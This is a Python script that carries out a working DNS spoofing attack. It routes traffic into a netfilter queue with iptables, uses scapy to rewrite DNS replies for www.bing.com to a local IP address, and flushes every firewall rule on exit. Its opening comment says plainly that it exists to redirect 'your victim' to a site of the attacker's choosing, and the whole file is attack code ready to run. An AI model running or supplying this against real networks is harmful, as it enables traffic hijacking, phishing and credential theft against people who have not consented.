#!/usr/bin/env python3
# in Ubuntu make sure uve ran "sudo apt-get install build-essential python-dev libnetfilter-queue-dev"
# This  script makes it possible to change the target website of your victim to your own choosing

import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--forward", dest="forward", default=False,
                        help="Enable Port forwarding")
    options = parser.parse_args()
    return options


def process_packet(packet):
    # lets scapyify it so we get endless options
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname="www.bing.com", rdata="192.168.20.7")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # Deleting for Scapy to recalculate
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # scapy recaluclated everythingx
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


def allow_packets_flow(forward=False):
    if forward:
        subprocess.call(["sudo", "iptables", "-I", "FORWARD", "-j",
                        "NFQUEUE", "--queue-num", "0"])
    else:
        subprocess.call(["sudo", "iptables", "-I", "INPUT", "-j",
                        "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["sudo", "iptables", "-I", "OUTPUT", "-j",
                        "NFQUEUE", "--queue-num", "0"])
    print("\n[+] Firewall rules updated!")


def reset_firewall():
    subprocess.call(["iptables", "--flush"])
    print("\n[+] Firewall reset successfully!")


if __name__ == "__main__":
    options = get_arguments()
    allow_packets_flow(options.forward)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    try:
        while True:
            queue.run()
    except KeyboardInterrupt:
        reset_firewall()
        print("\n[-] Exiting program...")
